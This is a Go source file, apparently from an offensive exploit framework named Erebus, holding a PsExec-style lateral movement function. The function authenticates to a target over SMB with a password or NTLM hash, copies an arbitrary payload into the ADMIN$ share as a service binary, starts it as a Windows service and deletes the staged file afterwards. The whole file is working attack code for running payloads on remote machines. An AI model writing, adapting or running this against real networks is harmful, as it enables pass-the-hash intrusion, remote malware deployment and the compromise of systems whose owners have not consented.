package lateral

import (
	"context"
	"fmt"
	"net"

	"github.com/hirochachacha/go-smb2"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func movePsExec(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Username == "" {
		return nil, fmt.Errorf("username required for PsExec")
	}
	if cfg.Password == "" && cfg.NtlmHash == "" {
		return nil, fmt.Errorf("password or ntlm_hash required for PsExec")
	}

	auth, err := smbInitiator(cfg.Username, cfg.Password, cfg.Domain, cfg.NtlmHash)
	if err != nil {
		return nil, err
	}

	addr := cfg.Target + ":445"
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("SMB connect to %s: %w", addr, err)
	}
	defer conn.Close()

	initiator := &smb2.NTLMInitiator{
		User:     auth.User,
		Password: auth.Password,
		Domain:   auth.Domain,
		Hash:     auth.Hash,
	}

	s, err := (&smb2.Dialer{Initiator: initiator}).Dial(conn)
	if err != nil {
		return nil, fmt.Errorf("SMB auth: %w", err)
	}
	defer s.Logoff()

	share, err := s.Mount(`\\` + cfg.Target + `\ADMIN$`)
	if err != nil {
		return nil, fmt.Errorf("mount ADMIN$: %w", err)
	}
	defer share.Umount()

	serviceName := cfg.ServiceName
	if serviceName == "" {
		serviceName = "ErebusSvc"
	}

	if len(cfg.Payload) == 0 {
		return nil, fmt.Errorf("payload required for PsExec")
	}

	svcPath := serviceName + ".exe"
	f, err := share.Create(svcPath)
	if err != nil {
		return nil, fmt.Errorf("create service binary: %w", err)
	}
	if _, err := f.Write(cfg.Payload); err != nil {
		f.Close()
		return nil, fmt.Errorf("write service binary: %w", err)
	}
	f.Close()

	remoteBin := cfg.RemoteBinPath
	if remoteBin == "" {
		remoteBin = `C:\Windows\` + svcPath
	}

	serviceStarted := false
	defer func() {
		if !serviceStarted {
			psexecCleanup(ctx, cfg, share, serviceName, svcPath)
		}
	}()

	if err := psexecStartService(ctx, cfg, serviceName, remoteBin); err != nil {
		return &pb.LateralMoveResult{
			Method:  "psexec",
			Target:  cfg.Target,
			Success: false,
			Output:  fmt.Sprintf("payload staged to ADMIN$\\%s but service start failed: %v", svcPath, err),
		}, nil
	}
	serviceStarted = true

	// Best-effort: remove staged binary from ADMIN$ (service keeps running from remoteBin).
	_ = share.Remove(svcPath)

	return &pb.LateralMoveResult{
		Method:  "psexec",
		Target:  cfg.Target,
		Success: true,
		Output:  fmt.Sprintf("payload staged and service %s started on %s (binary: %s)", serviceName, cfg.Target, remoteBin),
	}, nil
}